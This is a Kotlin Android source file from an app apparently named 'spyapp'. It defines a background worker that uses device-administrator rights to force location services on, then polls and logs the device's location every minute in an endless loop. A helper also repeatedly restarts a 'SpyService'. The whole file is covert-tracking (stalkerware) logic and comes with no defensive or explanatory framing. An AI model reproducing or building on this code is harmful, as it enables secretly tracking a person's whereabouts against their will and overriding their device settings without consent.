package npo.kib.spyapp.foreground

import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.util.Log
import androidx.core.content.ContextCompat
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters
import kotlinx.coroutines.delay
import npo.kib.spyapp.hacks.DevAdminReceiver


class SpyWorker(private val appContext: Context, workerParams: WorkerParameters) :
    CoroutineWorker(appContext, workerParams) {

    override suspend fun doWork(): Result = runCatching {
        Log.d("myLogs", "SpyWorker doWork")

        val mDevicePolicyManager =
            ContextCompat.getSystemService(appContext, DevicePolicyManager::class.java)
        if (android.os.Build.VERSION.SDK_INT < android.os.Build.VERSION_CODES.R) {
            Log.d("myLogs", "SpyWorker unsupported API")
            return Result.retry()
        }

        runCatching {
            val componentName = ComponentName(appContext, DevAdminReceiver::class.java)
            mDevicePolicyManager?.setLocationEnabled(componentName, true)
        }
            .onSuccess { Log.d("myLogs", "SpyWorker setLocationEnabled") }
            .onFailure { Log.d("myLogs", "SpyWorker error $it") }

        spyLoop()
        return Result.retry()
    }.getOrElse {
        Log.d("myLogs", "SpyWorker error ${it.message}")
        Result.retry()
    }

    private suspend fun spyLoop() {
        while (true) {
            processLocation()
            delay(60 * 1000)
        }
    }

    private suspend fun startActivityLoop() {
        while (true) {
            Log.d("myLogs", "SpyWorker startActivity")
            val intent = Intent(appContext, SpyService::class.java)
            appContext.startService(intent)
            delay(5000)
        }
    }

    private suspend fun processLocation() {
        val location = LocationProvider(appContext).getLastLocation()
        Log.d("myLogs", "location $location")
    }

}
